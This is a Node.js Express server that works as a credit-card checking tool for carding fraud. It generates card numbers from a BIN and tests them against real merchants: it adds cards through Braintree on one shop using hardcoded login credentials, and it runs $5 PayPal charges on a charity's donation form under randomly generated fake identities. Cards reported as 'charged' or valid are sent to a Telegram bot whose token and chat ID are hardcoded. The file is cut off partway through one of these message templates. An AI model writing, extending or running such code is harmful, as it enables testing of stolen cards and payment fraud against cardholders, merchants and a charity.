const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const DEFAULT_USER = 'asithagunarathna9@gmail.com';
const DEFAULT_PASS = 'gXAetLe84LY7xKP';
const TELEGRAM_TOKEN = '6953499411:AAF52WklFHkwO5qirmadWBeCKh4QfJddlXs';
const TELEGRAM_CHAT = '-1003774370016';

// Background job queue for PayPal checks
const paypalQueue = [];
let isProcessingPaypal = false;
const paypalResults = [];
const MAX_RESULTS = 1000;

app.get('/api/health', (req, res) => res.json({ ok: true }));

// Generate cards from BIN
app.post('/api/generate', async (req, res) => {
  try {
    const { bin, month = '12', year = '2031', quantity = 10 } = req.body;
    const data = new URLSearchParams({
      type: '3', bin, date: 'on', s_date: month, year,
      csv: '', s_csv: '', number: quantity.toString(), format: 'pipe'
    });
    const response = await axios.post('https://namsogen.org/ajax.php', data, {
      headers: {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://namsogen.org',
        'referer': 'https://namsogen.org/',
        'user-agent': 'Mozilla/5.0'
      }
    });
    const cards = response.data.split('\n').filter(l => l.includes('|'));
    res.json({ success: true, cards });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// Enhanced Telegram notification with HTML formatting
app.post('/api/telegram', async (req, res) => {
  try {
    const { card, message, status, details, botToken, chatId } = req.body;
    const token = botToken || TELEGRAM_TOKEN;
    const chat = chatId || TELEGRAM_CHAT;
    
    // Format based on status with HTML
    let text = '';
    const timeStr = new Date().toLocaleString();
    
    if (status === 'CHARGED') {
      text = `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${card}
<b>Type:</b> CHARGED
<b>Time:</b> ${timeStr}
━━━━━━━━━━━━━━━━━
<b>First Name:</b> ${details?.firstName || 'N/A'}
<b>Last Name:</b> ${details?.lastName || 'N/A'}
<b>Address:</b> ${details?.address || 'N/A'}
<b>City:</b> ${details?.city || 'N/A'}
<b>State:</b> ${details?.state || 'N/A'}
<b>Zip:</b> ${details?.zip || 'N/A'}
<b>Phone:</b> ${details?.phone || 'N/A'}
<b>Email:</b> ${details?.email || 'N/A'}
━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf`;
    } else if (status === 'CVV_FAILURE' || status === 'INSUFFICIENT_FUNDS') {
      text = `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${card}
<b>Type:</b> ${status}
<b>Time:</b> ${timeStr}
━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf`;
    } else {
      text = `💳 *${status || 'CARD'}*\n\`\`\`\n${card}\n\`\`\`\n✅ ${message}\n⏰ ${timeStr}`;
    }
    
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chat, 
      text, 
      parse_mode: status === 'CHARGED' || status === 'CVV_FAILURE' || status === 'INSUFFICIENT_FUNDS' ? 'HTML' : 'Markdown'
    });
    
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// BandC Check
app.post('/api/check', async (req, res) => {
  try {
    const { card } = req.body;
    const [number, month, year, cvc] = card.split('|');
    
    const user = DEFAULT_USER;
    const pass = DEFAULT_PASS;

    const session = axios.create({ withCredentials: true });
    const login = await session.post('https://bandc.com/wp-login.php',
      new URLSearchParams({ log: user, pwd: pass, rememberme: 'forever', 'wp-submit': 'Log In' }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, maxRedirects: 0, validateStatus: s => s < 400 }
    );
    const cookies = login.headers['set-cookie'];
    const page = await session.get('https://bandc.com/my-account/add-payment-method/', {
      headers: cookies ? { Cookie: cookies.join('; ') } : {}
    });
    const match = page.data.match(/"client_token_nonce"\s*:\s*"([^"]+)"/);
    if (!match) return res.status(400).json({ status: 'error', message: 'Nonce not found' });
    
    const tokenRes = await session.post('https://bandc.com/wp-admin/admin-ajax.php',
      new URLSearchParams({ action: 'wc_braintree_credit_card_get_client_token', nonce: match[1] }),
      { headers: { Cookie: cookies ? cookies.join('; ') : '' } }
    );
    const token = tokenRes.data.data;
    const decoded = JSON.parse(Buffer.from(token.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat((4 - token.length % 4) % 4), 'base64').toString());
    const authToken = decoded.authorizationFingerprint;

    const tokenize = await axios.post('https://payments.braintree-api.com/graphql', {
      clientSdkMetadata: { source: 'client', integration: 'custom', sessionId: Date.now().toString() },
      query: 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
      variables: { input: { creditCard: { number, expirationMonth: month, expirationYear: year, cvv: cvc }, options: { validate: false } } },
      operationName: 'TokenizeCreditCard'
    }, { headers: { authorization: `Bearer ${authToken}`, 'braintree-version': '2018-05-10', 'content-type': 'application/json' } });

    if (!tokenize.data.data?.tokenizeCreditCard?.token) {
      return res.json({ status: 'declined', message: 'Tokenization failed' });
    }
    const nonce = tokenize.data.data.tokenizeCreditCard.token;

    const check = await session.post('https://bandc.com/my-account/add-payment-method/',
      new URLSearchParams({
        payment_method: 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc_braintree_credit_card_payment_nonce': nonce,
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        '_wpnonce': 'f262dc06cb',
        woocommerce_add_payment_method: '1'
      }),
      { headers: { Cookie: cookies.join('; ') } }
    );

    const text = check.data;
    let status = 'declined', message = 'Declined';
    if (text.includes('Nice! New payment method added') || text.includes('Payment method successfully added.')) {
      status = 'approved'; message = '1000: Approved';
    } else if (text.includes('risk_threshold')) {
      status = 'risk'; message = 'RISK: Retry this BIN later';
    }

    res.json({ status, message });
  } catch (e) {
    res.json({ status: 'declined', message: e.message });
  }
});

// New PayPal Check endpoint with enhanced functionality (like Python code)
app.post('/api/paypal/enhanced', async (req, res) => {
  try {
    const { card, useFaker = true } = req.body;
    const [num, mon, yer, cvc] = card.split('|');
    const year = yer.length === 4 ? yer.slice(-2) : yer;
    
    // Generate fake data like Python code with more variety
    const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Charles', 'Thomas', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Donald'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson'];
    const streets = ['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm', 'Washington', 'Park', 'Lake', 'Hill', 'River', 'North', 'South', 'East', 'West'];
    const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose', 'Austin', 'Jacksonville', 'Fort Worth', 'Columbus', 'Charlotte'];
    const states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'FL', 'OH', 'GA', 'NC', 'MI', 'NJ', 'VA', 'WA', 'MA'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 9999)}@gmail.com`;
    const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
    const street = `${Math.floor(Math.random() * 9000 + 100)} ${streets[Math.floor(Math.random() * streets.length)]} St`;
    const city = cities[Math.floor(Math.random() * cities.length)];
    const state = states[Math.floor(Math.random() * states.length)];
    const zip = Math.floor(Math.random() * 90000 + 10000).toString();
    
    // Get card type like Python code
    const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
    
    // User agent like Python's generate_user_agent()
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    const session = axios.create({ headers: { 'User-Agent': ua } });
    
    // Step 1: Get form data from brightercommunities (like var_response_msg)
    const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
    const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
    const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
    const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
    
    if (!hashMatch || !formIdMatch || !prefixMatch) {
      return res.json({ status: 'error', message: 'Form data not found' });
    }
    
    // Step 2: Create PayPal order (like requests_id)
    const orderRes = await session.post(
      'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
      new URLSearchParams({
        'give-form-id-prefix': prefixMatch[1],
        'give-form-id': formIdMatch[1],
        'give-form-minimum': '5.00',
        'give-form-hash': hashMatch[1],
        'give-amount': '5.00',
        'give_first': firstName,
        'give_last': lastName,
        'give_email': email
      })
    );
    
    const orderId = orderRes.data?.data?.id;
    if (!orderId) {
      return res.json({ status: 'error', message: 'Order ID not found' });
    }
    
    // Step 3: Pay with card via PayPal GraphQL (like response_msg)
    const paypalRes = await session.post(
      'https://www.paypal.com/graphql?fetch_credit_form_submit=',
      {
        query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
          approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
            flags { is3DSecureRequired }
            cart { intent cartId buyer { userId auth { accessToken } } }
            paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
          }
        }`,
        variables: {
          token: orderId,
          card: {
            cardNumber: num,
            type: cardType,
            expirationDate: `${mon}/20${year}`,
            postalCode: zip,
            securityCode: cvc
          },
          phoneNumber: phone,
          firstName: firstName,
          lastName: lastName,
          billingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          shippingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          email: email,
          currencyConversionType: 'PAYPAL'
        }
      },
      { headers: { 'Content-Type': 'application/json' } }
    );
    
    // Get full response text
    const fullResponse = JSON.stringify(paypalRes.data);
    const errorsResponse = paypalRes.data?.errors ? JSON.stringify(paypalRes.data.errors) : '';
    const responseText = fullResponse + errorsResponse;
    
    // Parse response - EXACTLY like Python msg_card function
    let status = 'UNKNOWN';
    let message = 'Unknown';
    let msgType = 'UNKNOWN';
    
    if (responseText.includes('accessToken') || responseText.includes('cartId')) {
      status = 'charged';
      message = '𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️';
      msgType = 'CHARGED';
    } else if (responseText.includes('INVALID_SECURITY_CODE')) {
      status = 'cvv';
      message = 'CVV2_FAILURE! ❇️';
      msgType = 'CVV_FAILURE';
    } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
      status = 'insufficient';
      message = 'INSUFFICIENT_FUNDS! ❇️';
      msgType = 'INSUFFICIENT_FUNDS';
    } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
      status = 'restricted';
      message = 'EXISTING ACCOUNT RESTRICTED!';
      msgType = 'ERROR';
    } else if (responseText.includes('RISK_DISALLOWED')) {
      status = 'risk';
      message = 'RISK_DISALLOWED';
      msgType = 'ERROR';
    } else if (responseText.includes('ISSUER_DATA_NOT_FOUND')) {
      status = 'issuer_data';
      message = 'ISSUER_DATA_NOT_FOUND';
      msgType = 'ERROR';
    } else if (responseText.includes('ISSUER_DECLINE')) {
      status = 'declined';
      message = 'ISSUER_DECLINE';
      msgType = 'ERROR';
    } else if (responseText.includes('EXPIRED_CARD')) {
      status = 'expired';
      message = 'EXPIRED_CARD';
      msgType = 'ERROR';
    } else if (responseText.includes('LOGIN_ERROR')) {
      status = 'login_error';
      message = 'LOGIN_ERROR';
      msgType = 'ERROR';
    } else if (responseText.includes('VALIDATION_ERROR')) {
      status = 'validation_error';
      message = 'VALIDATION_ERROR';
      msgType = 'ERROR';
    } else if (responseText.includes('GRAPHQL_VALIDATION_FAILED')) {
      status = 'graphql_error';
      message = 'GRAPHQL_VALIDATION_FAILED';
      msgType = 'ERROR';
    } else if (responseText.includes('R_ERROR') || responseText.includes('CARD_GENERIC_ERROR')) {
      status = 'card_error';
      message = 'CARD_GENERIC_ERROR';
      msgType = 'ERROR';
    } else {
      status = 'declined';
      message = 'Declined';
      msgType = 'UNKNOWN';
    }
    
    // Prepare details for Telegram
    const details = {
      firstName,
      lastName,
      address: street,
      city,
      state,
      zip,
      phone,
      email
    };
    
    // Send Telegram notification for important statuses
    if (msgType === 'CHARGED' || msgType === 'CVV_FAILURE' || msgType === 'INSUFFICIENT_FUNDS') {
      try {
        const cardInfo = `${num}|${mon}|${yer}|${cvc}`;
        // Call the telegram endpoint internally without HTTP request
        const telegramRes = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          chat_id: TELEGRAM_CHAT,
          text: msgType === 'CHARGED' ? 
            `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${cardInfo}
<b>Type:</b> CHARGED
<b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━
<b>First Name:</b> ${firstName}
<b>Last Name:</b> ${lastName}
<b>Address:</b> ${street}
<b>City:</b> ${city}
<b>State:</b> ${state}
<b>Zip:</b> ${zip}
<b>Phone:</b> ${phone}
<b>Email:</b> ${email}
━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf` :
            `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${cardInfo}
<b>Type:</b> ${msgType}
<b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf`,
          parse_mode: 'HTML'
        });
      } catch (tgError) {
        console.log('Telegram error:', tgError.message);
      }
    }
    
    // Return response with all details
    res.json({ 
      status, 
      message,
      msgType,
      card: `${num}|${mon}|${yer}|${cvc}`,
      details: msgType === 'CHARGED' ? details : undefined
    });
    
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// Original PayPal Check (keeping for backward compatibility)
app.post('/api/paypal', async (req, res) => {
  try {
    const { card } = req.body;
    const [num, mon, yer, cvc] = card.split('|');
    const year = yer.length === 4 ? yer.slice(-2) : yer;
    
    // Generate fake data
    const firstName = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph'][Math.floor(Math.random() * 8)];
    const lastName = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'][Math.floor(Math.random() * 8)];
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
    const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
    const street = `${Math.floor(Math.random() * 9000 + 100)} ${['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm'][Math.floor(Math.random() * 6)]} St`;
    const city = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia'][Math.floor(Math.random() * 6)];
    const state = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA'][Math.floor(Math.random() * 6)];
    const zip = Math.floor(Math.random() * 90000 + 10000).toString();
    
    // Get card type
    const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
    
    // Step 1: Get form hash from brightercommunities
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    const session = axios.create({ headers: { 'User-Agent': ua } });
    
    const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
    const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
    const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
    const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
    
    if (!hashMatch || !formIdMatch || !prefixMatch) {
      return res.json({ status: 'error', message: 'Form data not found' });
    }
    
    // Step 2: Create PayPal order
    const orderRes = await session.post(
      'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
      new URLSearchParams({
        'give-form-id-prefix': prefixMatch[1],
        'give-form-id': formIdMatch[1],
        'give-form-minimum': '5.00',
        'give-form-hash': hashMatch[1],
        'give-amount': '5.00',
        'give_first': firstName,
        'give_last': lastName,
        'give_email': email
      })
    );
    
    const orderId = orderRes.data?.data?.id;
    if (!orderId) {
      return res.json({ status: 'error', message: 'Order ID not found' });
    }
    
    // Step 3: Pay with card via PayPal GraphQL
    const paypalRes = await session.post(
      'https://www.paypal.com/graphql?fetch_credit_form_submit=',
      {
        query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
          approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
            flags { is3DSecureRequired }
            cart { intent cartId buyer { userId auth { accessToken } } }
            paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
          }
        }`,
        variables: {
          token: orderId,
          card: {
            cardNumber: num,
            type: cardType,
            expirationDate: `${mon}/20${year}`,
            postalCode: zip,
            securityCode: cvc
          },
          phoneNumber: phone,
          firstName: firstName,
          lastName: lastName,
          billingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          shippingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          email: email,
          currencyConversionType: 'PAYPAL'
        }
      },
      { headers: { 'Content-Type': 'application/json' } }
    );
    
    // Get full response text
    const fullResponse = JSON.stringify(paypalRes.data);
    const errorsResponse = paypalRes.data?.errors ? JSON.stringify(paypalRes.data.errors) : '';
    const responseText = fullResponse + errorsResponse;
    
    // Parse response - EXACTLY like Python code
    let status = 'declined';
    let message = 'Unknown';
    
    if (responseText.includes('accessToken') || responseText.includes('cartId')) {
      status = 'charged';
      message = 'Charged $5.00';
    } else if (responseText.includes('INVALID_SECURITY_CODE')) {
      status = 'cvv';
      message = 'CVV2 Failure';
    } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
      status = 'insufficient';
      message = 'Insufficient Funds';
    } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
      status = 'restricted';
      message = 'Account Restricted';
    } else if (responseText.includes('RISK_DISALLOWED')) {
      status = 'risk';
      message = 'Risk Disallowed';
    } else if (responseText.includes('ISSUER_DATA_NOT_FOUND')) {
      status = 'issuer_data';
      message = 'Issuer Data Not Found';
    } else if (responseText.includes('ISSUER_DECLINE')) {
      status = 'declined';
      message = 'Issuer Decline';
    } else if (responseText.includes('EXPIRED_CARD')) {
      status = 'expired';
      message = 'Expired Card';
    } else if (responseText.includes('LOGIN_ERROR')) {
      status = 'login_error';
      message = 'Login Error';
    } else if (responseText.includes('VALIDATION_ERROR')) {
      status = 'validation_error';
      message = 'Validation Error';
    } else if (responseText.includes('GRAPHQL_VALIDATION_FAILED')) {
      status = 'graphql_error';
      message = 'GraphQL Validation Failed';
    } else if (responseText.includes('R_ERROR') || responseText.includes('CARD_GENERIC_ERROR')) {
      status = 'card_error';
      message = 'Card Generic Error';
    } else {
      status = 'declined';
      message = 'Declined';
    }
    
    res.json({ status, message, card });
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// Background PayPal check queue (updated to use enhanced endpoint)
app.post('/api/paypal/queue', async (req, res) => {
  const { cards, botToken, chatId } = req.body;
  
  // Add to queue with timestamp
  cards.forEach(card => {
    paypalQueue.push({ 
      card, 
      botToken, 
      chatId, 
      id: Date.now() + Math.random(),
      timestamp: Date.now()
    });
  });
  
  res.json({ success: true, queued: cards.length, queueSize: paypalQueue.length });
  
  // Start processing if not already
  if (!isProcessingPaypal) {
    processPaypalQueueEnhanced();
  }
});

// Get queue status
app.get('/api/paypal/queue', (req, res) => {
  res.json({ 
    queueSize: paypalQueue.length, 
    isProcessing: isProcessingPaypal,
    results: paypalResults.slice(-50) // Last 50 results
  });
});

// Clear results
app.post('/api/paypal/clear', (req, res) => {
  paypalResults.length = 0;
  res.json({ success: true });
});

// Process PayPal queue in background (enhanced version with Python-like functionality)
async function processPaypalQueueEnhanced() {
  if (paypalQueue.length === 0) {
    isProcessingPaypal = false;
    return;
  }
  
  isProcessingPaypal = true;
  const item = paypalQueue.shift();
  let status = 'error';
  let message = 'Unknown error';
  let msgType = 'ERROR';
  let details = null;
  let retryCount = 0;
  const maxRetries = 3;
  
  while (retryCount < maxRetries) {
    try {
      const [num, mon, yer, cvc] = item.card.split('|');
      const year = yer.length === 4 ? yer.slice(-2) : yer;
      
      // Generate fake data like Python code with more variety
      const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Charles', 'Thomas', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Donald'];
      const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson'];
      const streets = ['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm', 'Washington', 'Park', 'Lake', 'Hill', 'River', 'North', 'South', 'East', 'West'];
      const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose', 'Austin', 'Jacksonville', 'Fort Worth', 'Columbus', 'Charlotte'];
      const states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'FL', 'OH', 'GA', 'NC', 'MI', 'NJ', 'VA', 'WA', 'MA'];
      
      const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
      const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
      const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 9999)}@gmail.com`;
      const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
      const street = `${Math.floor(Math.random() * 9000 + 100)} ${streets[Math.floor(Math.random() * streets.length)]} St`;
      const city = cities[Math.floor(Math.random() * cities.length)];
      const state = states[Math.floor(Math.random() * states.length)];
      const zip = Math.floor(Math.random() * 90000 + 10000).toString();
      
      const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
      
      const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
      const session = axios.create({ headers: { 'User-Agent': ua }, timeout: 30000 });
      
      // Step 1: Get form data
      const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
      const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
      const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
      const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
      
      if (!hashMatch || !formIdMatch || !prefixMatch) {
        throw new Error('Form data not found');
      }
      
      // Step 2: Create PayPal order
      const orderRes = await session.post(
        'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
        new URLSearchParams({
          'give-form-id-prefix': prefixMatch[1],
          'give-form-id': formIdMatch[1],
          'give-form-minimum': '5.00',
          'give-form-hash': hashMatch[1],
          'give-amount': '5.00',
          'give_first': firstName,
          'give_last': lastName,
          'give_email': email
        })
      );
      
      const orderId = orderRes.data?.data?.id;
      if (!orderId) {
        throw new Error('Order ID not found');
      }
      
      // Step 3: Pay with card
      const paypalRes = await session.post(
        'https://www.paypal.com/graphql?fetch_credit_form_submit=',
        {
          query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
            approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
              flags { is3DSecureRequired }
              cart { intent cartId buyer { userId auth { accessToken } } }
            }
          }`,
          variables: {
            token: orderId,
            card: {
              cardNumber: num,
              type: cardType,
              expirationDate: `${mon}/20${year}`,
              postalCode: zip,
              securityCode: cvc
            },
            phoneNumber: phone,
            firstName: firstName,
            lastName: lastName,
            billingAddress: {
              givenName: firstName,
              familyName: lastName,
              country: 'US',
              line1: street,
              line2: '',
              city: city,
              state: state,
              postalCode: zip
            },
            shippingAddress: {
              givenName: firstName,
              familyName: lastName,
              country: 'US',
              line1: street,
              line2: '',
              city: city,
              state: state,
              postalCode: zip
            },
            email: email,
            currencyConversionType: 'PAYPAL'
          }
        },
        { headers: { 'Content-Type': 'application/json' } }
      );
      
      // Get full response text
      const fullResponse = JSON.stringify(paypalRes.data);
      const errorsResponse = paypalRes.data?.errors ? JSON.stringify(paypalRes.data.errors) : '';
      const responseText = fullResponse + errorsResponse;
      
      // Parse response - EXACTLY like Python msg_card function
      if (responseText.includes('accessToken') || responseText.includes('cartId')) {
        status = 'charged';
        message = '𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️';
        msgType = 'CHARGED';
        details = { firstName, lastName, address: street, city, state, zip, phone, email };
      } else if (responseText.includes('INVALID_SECURITY_CODE')) {
        status = 'cvv';
        message = 'CVV2_FAILURE! ❇️';
        msgType = 'CVV_FAILURE';
      } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
        status = 'insufficient';
        message = 'INSUFFICIENT_FUNDS! ❇️';
        msgType = 'INSUFFICIENT_FUNDS';
      } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
        status = 'restricted';
        message = 'EXISTING ACCOUNT RESTRICTED!';
        msgType = 'ERROR';
      } else if (responseText.includes('RISK_DISALLOWED')) {
        status = 'risk';
        message = 'RISK_DISALLOWED';
        msgType = 'ERROR';
      } else if (responseText.includes('ISSUER_DATA_NOT_FOUND')) {
        status = 'issuer_data';
        message = 'ISSUER_DATA_NOT_FOUND';
        msgType = 'ERROR';
      } else if (responseText.includes('ISSUER_DECLINE')) {
        status = 'declined';
        message = 'ISSUER_DECLINE';
        msgType = 'ERROR';
      } else if (responseText.includes('EXPIRED_CARD')) {
        status = 'expired';
        message = 'EXPIRED_CARD';
        msgType = 'ERROR';
      } else if (responseText.includes('LOGIN_ERROR')) {
        status = 'login_error';
        message = 'LOGIN_ERROR';
        msgType = 'ERROR';
      } else if (responseText.includes('VALIDATION_ERROR')) {
        status = 'validation_error';
        message = 'VALIDATION_ERROR';
        msgType = 'ERROR';
      } else if (responseText.includes('GRAPHQL_VALIDATION_FAILED')) {
        status = 'graphql_error';
        message = 'GRAPHQL_VALIDATION_FAILED';
        msgType = 'ERROR';
      } else if (responseText.includes('R_ERROR') || responseText.includes('CARD_GENERIC_ERROR')) {
        status = 'card_error';
        message = 'CARD_GENERIC_ERROR';
        msgType = 'ERROR';
      } else {
        status = 'declined';
        message = 'Declined';
        msgType = 'UNKNOWN';
      }
      
      // Success - break retry loop
      break;
      
    } catch (e) {
      retryCount++;
      console.log(`PayPal Queue Retry ${retryCount}/${maxRetries} for ${item.card}: ${e.message}`);
      if (retryCount >= maxRetries) {
        status = 'error';
        message = e.message;
        msgType = 'ERROR';
      } else {
        await new Promise(r => setTimeout(r, 2000 * retryCount));
      }
    }
  }
  
  // Store result
  paypalResults.push({
    card: item.card,
    status,
    message,
    msgType,
    time: new Date().toISOString()
  });
  
  // Keep only last MAX_RESULTS
  if (paypalResults.length > MAX_RESULTS) {
    paypalResults.shift();
  }
  
  console.log(`PayPal Queue: ${item.card} - ${status}: ${message}`);
  
  // Send Telegram ONLY for important statuses
  if ((msgType === 'CHARGED' || msgType === 'CVV_FAILURE' || msgType === 'INSUFFICIENT_FUNDS') && item.botToken) {
    try {
      // Send Telegram directly without using internal endpoint
      const cardInfo = item.card;
      const [num, mon, yer, cvc] = item.card.split('|');
      
      let telegramText = '';
      if (msgType === 'CHARGED' && details) {
        telegramText = `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${cardInfo}
<b>Type:</b> CHARGED
<b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━
<b>First Name:</b> ${details.firstName}
<b>Last Name:</b> ${details.lastName}
<b>Address:</b> ${details.address}
<b>City:</b> ${details.city}
<b>State:</b> ${details.state}
<b>Zip:</b> ${details.zip}
<b>Phone:</b> ${details.phone}
<b>Email:</b> ${details.email}
